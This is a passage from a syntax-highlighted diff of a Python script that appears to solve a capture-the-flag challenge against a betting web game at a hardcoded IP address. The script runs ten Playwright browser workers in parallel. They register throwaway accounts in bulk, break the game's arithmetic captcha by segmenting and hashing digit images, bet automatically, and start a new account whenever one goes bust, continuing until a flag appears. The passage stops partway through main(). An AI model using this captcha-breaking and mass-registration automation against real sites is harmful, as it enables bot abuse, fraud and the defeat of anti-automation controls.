+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> playwright.async_api <span style="color:#f92672">import</span> async_playwright
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://34.185.144.221:31082&#34;</span>
+</span></span><span style="display:flex;"><span>NUM_WORKERS <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DIGIT_MAP <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>map_lock <span style="color:#f92672">=</span> asyncio<span style="color:#f92672">.</span>Lock()
+</span></span><span style="display:flex;"><span>input_lock <span style="color:#f92672">=</span> asyncio<span style="color:#f92672">.</span>Lock()
+</span></span><span style="display:flex;"><span>flag_found <span style="color:#f92672">=</span> asyncio<span style="color:#f92672">.</span>Event()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Each worker gets its own counter in a completely separate range</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Worker 1: 11000100, 11000101, ...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Worker 2: 22000200, 22000201, ...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># etc.</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_counter</span>(worker_id):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> itertools<span style="color:#f92672">.</span>count(worker_id <span style="color:#f92672">*</span> <span style="color:#ae81ff">11000100</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_flag</span>(text):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> pattern <span style="color:#f92672">in</span> [<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;ctf\{.*?\}&#39;</span>, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;ROCSC\{.*?\}&#39;</span>, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;CTF\{.*?\}&#39;</span>, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;FLAG\{.*?\}&#39;</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(pattern, text, re<span style="color:#f92672">.</span>IGNORECASE)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_segments</span>(screenshot_bytes):
+</span></span><span style="display:flex;"><span>    img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(io<span style="color:#f92672">.</span>BytesIO(screenshot_bytes))<span style="color:#f92672">.</span>convert(<span style="color:#e6db74">&#39;L&#39;</span>)
+</span></span><span style="display:flex;"><span>    inner <span style="color:#f92672">=</span> img<span style="color:#f92672">.</span>crop((<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, img<span style="color:#f92672">.</span>width<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>, img<span style="color:#f92672">.</span>height<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    arr <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(inner) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>    rows <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>any(arr, axis<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    cols <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>any(arr, axis<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rows<span style="color:#f92672">.</span>any():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> [], <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    rmin, rmax <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>where(rows)[<span style="color:#ae81ff">0</span>][[<span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
+</span></span><span style="display:flex;"><span>    cmin, cmax <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>where(cols)[<span style="color:#ae81ff">0</span>][[<span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
+</span></span><span style="display:flex;"><span>    cropped <span style="color:#f92672">=</span> arr[max(<span style="color:#ae81ff">0</span>,rmin<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>):rmax<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, max(<span style="color:#ae81ff">0</span>,cmin<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>):cmax<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    col_proj <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>sum(cropped, axis<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    in_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    segments <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(col_proj)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> in_char <span style="color:#f92672">and</span> col_proj[x] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            in_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>; start <span style="color:#f92672">=</span> x
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> in_char <span style="color:#f92672">and</span> col_proj[x] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            in_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>; segments<span style="color:#f92672">.</span>append([start, x])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> in_char:
+</span></span><span style="display:flex;"><span>        segments<span style="color:#f92672">.</span>append([start, len(col_proj)])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> segments:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> [], <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Captcha is always exactly 5 chars: D D + D D</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Merge closest pairs until we have exactly 5</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(segments) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>:
+</span></span><span style="display:flex;"><span>        gaps <span style="color:#f92672">=</span> [segments[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> segments[i][<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(segments)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)]
+</span></span><span style="display:flex;"><span>        min_idx <span style="color:#f92672">=</span> gaps<span style="color:#f92672">.</span>index(min(gaps))
+</span></span><span style="display:flex;"><span>        segments[min_idx][<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> segments[min_idx<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        segments<span style="color:#f92672">.</span>pop(min_idx<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [cropped[:, x1:x2] <span style="color:#66d9ef">for</span> x1, x2 <span style="color:#f92672">in</span> segments], cropped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">seg_to_hash</span>(seg):
+</span></span><span style="display:flex;"><span>    img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(seg<span style="color:#f92672">.</span>astype(np<span style="color:#f92672">.</span>uint8) <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>)
+</span></span><span style="display:flex;"><span>    img <span style="color:#f92672">=</span> img<span style="color:#f92672">.</span>resize((<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">26</span>), Image<span style="color:#f92672">.</span>NEAREST)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tuple(np<span style="color:#f92672">.</span>array(img)<span style="color:#f92672">.</span>flatten() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">128</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode_captcha</span>(screenshot_bytes):
+</span></span><span style="display:flex;"><span>    segs, _ <span style="color:#f92672">=</span> extract_segments(screenshot_bytes)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> segs:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, []
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    unknowns <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, seg <span style="color:#f92672">in</span> enumerate(segs):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Position 2 (middle of 5) is always the + sign</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;+&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        h <span style="color:#f92672">=</span> seg_to_hash(seg)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> h <span style="color:#f92672">in</span> DIGIT_MAP:
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">+=</span> DIGIT_MAP[h]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;?&#39;</span>
+</span></span><span style="display:flex;"><span>            unknowns<span style="color:#f92672">.</span>append((i, seg, h))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result, unknowns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">seed_from_known_captcha</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;captcha_test.png&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>        segs, _ <span style="color:#f92672">=</span> extract_segments(data)
+</span></span><span style="display:flex;"><span>        known <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(segs) <span style="color:#f92672">==</span> len(known):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> seg, label <span style="color:#f92672">in</span> zip(segs, known):
+</span></span><span style="display:flex;"><span>                DIGIT_MAP[seg_to_hash(seg)] <span style="color:#f92672">=</span> label
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Seeded map: </span><span style="color:#e6db74">{</span>set(known)<span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>len(DIGIT_MAP)<span style="color:#e6db74">}</span><span style="color:#e6db74"> entries)&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Seed failed: expected 5 segs, got </span><span style="color:#e6db74">{</span>len(segs)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] captcha_test.png not found, will learn interactively&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">learn_unknown</span>(seg, h, worker_id):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">with</span> input_lock:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> h <span style="color:#f92672">in</span> DIGIT_MAP:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> DIGIT_MAP[h]
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">] Unknown character:&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> seg:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;    &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;██&#39;</span> <span style="color:#66d9ef">if</span> p <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;  &#39;</span> <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> row))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    What digit/char is this? &#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        label <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> asyncio<span style="color:#f92672">.</span>get_event_loop()<span style="color:#f92672">.</span>run_in_executor(<span style="color:#66d9ef">None</span>, input)
+</span></span><span style="display:flex;"><span>        label <span style="color:#f92672">=</span> label<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> label:
+</span></span><span style="display:flex;"><span>            DIGIT_MAP[h] <span style="color:#f92672">=</span> label
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    [+] Learned &#39;</span><span style="color:#e6db74">{</span>label<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; (map: </span><span style="color:#e6db74">{</span>len(DIGIT_MAP)<span style="color:#e6db74">}</span><span style="color:#e6db74"> entries)&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> label
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_bet</span>(coins):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> max(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">200</span> <span style="color:#f92672">-</span> coins)  <span style="color:#75715e"># one win reaches 200</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> max(<span style="color:#ae81ff">1</span>, coins <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>)       <span style="color:#75715e"># bet half, fast growth</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">worker</span>(worker_id, browser):
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">=</span> make_counter(worker_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_session</span>():
+</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">=</span> next(counter)
+</span></span><span style="display:flex;"><span>        context <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> browser<span style="color:#f92672">.</span>new_context()
+</span></span><span style="display:flex;"><span>        page <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> context<span style="color:#f92672">.</span>new_page()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>goto(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE<span style="color:#e6db74">}</span><span style="color:#e6db74">/register&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>fill(<span style="color:#e6db74">&#39;input[name=&#34;username&#34;]&#39;</span>, str(idx))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>fill(<span style="color:#e6db74">&#39;input[name=&#34;password&#34;]&#39;</span>, str(idx))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>click(<span style="color:#e6db74">&#39;button[type=&#34;submit&#34;]&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">] New account: </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> context, page
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    context, page <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> new_session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> flag_found<span style="color:#f92672">.</span>is_set():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>goto(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE<span style="color:#e6db74">}</span><span style="color:#e6db74">/game&#34;</span>)
+</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>content()
+</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> check_flag(html)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> flag:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">] 🚩 FLAG: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            flag_found<span style="color:#f92672">.</span>set()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        hud_text <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>inner_text(<span style="color:#e6db74">&#39;.hud&#39;</span>)
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;COINS: (\d+)&#39;</span>, hud_text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> m:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        coins <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">] Busted!&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> context<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            context, page <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> new_session()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        element <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>query_selector(<span style="color:#e6db74">&#39;.captcha-container&#39;</span>)
+</span></span><span style="display:flex;"><span>        screenshot_bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> element<span style="color:#f92672">.</span>screenshot()
+</span></span><span style="display:flex;"><span>        decoded, unknowns <span style="color:#f92672">=</span> decode_captcha(screenshot_bytes)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> unknowns:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> uidx, seg, h <span style="color:#f92672">in</span> unknowns:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> h <span style="color:#f92672">in</span> DIGIT_MAP:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                label <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> learn_unknown(seg, h, worker_id)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> label:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            decoded, unknowns <span style="color:#f92672">=</span> decode_captcha(screenshot_bytes)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> decoded <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#f92672">in</span> decoded:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;(\d+)\+(\d+)&#39;</span>, decoded)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        solution <span style="color:#f92672">=</span> int(<span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> int(<span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>        bet <span style="color:#f92672">=</span> get_bet(coins)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">] Coins:</span><span style="color:#e6db74">{</span>coins<span style="color:#e6db74">}</span><span style="color:#e6db74"> | </span><span style="color:#e6db74">{</span>decoded<span style="color:#e6db74">}</span><span style="color:#e6db74">=</span><span style="color:#e6db74">{</span>solution<span style="color:#e6db74">}</span><span style="color:#e6db74"> | bet:</span><span style="color:#e6db74">{</span>bet<span style="color:#e6db74">}</span><span style="color:#e6db74"> | map:</span><span style="color:#e6db74">{</span>len(DIGIT_MAP)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>fill(<span style="color:#e6db74">&#39;input[name=&#34;bet&#34;]&#39;</span>, str(bet))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>fill(<span style="color:#e6db74">&#39;input[name=&#34;captcha_answer&#34;]&#39;</span>, str(solution))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>click(<span style="color:#e6db74">&#39;button[type=&#34;submit&#34;]&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>content()
+</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> check_flag(html)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> flag:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">] 🚩 FLAG: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            flag_found<span style="color:#f92672">.</span>set()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            flash <span style="color:#f92672">=</span> (<span style="color:#66d9ef">await</span> page<span style="color:#f92672">.</span>inner_text(<span style="color:#e6db74">&#39;.flash&#39;</span>))<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[W</span><span style="color:#e6db74">{</span>worker_id<span style="color:#e6db74">}</span><span style="color:#e6db74">]   =&gt; </span><span style="color:#e6db74">{</span>flash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> context<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    seed_from_known_captcha()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">with</span> async_playwright() <span style="color:#66d9ef">as</span> p:
+</span></span><span style="display:flex;"><span>        browser <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> p<span style="color:#f92672">.</span>chromium<span style="color:#f92672">.</span>launch(headless<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Launching </span><span style="color:#e6db74">{</span>NUM_WORKERS<span style="color:#e6db74">}</span><span style="color:#e6db74"> workers...&#34;</span>)
+</span></span><span style="display:flex;"><span>        tasks <span style="color:#f92672">=</span> [asyncio<span style="color:#f92672">.</span>create_task(worker(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, browser)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(NUM_WORKERS)]
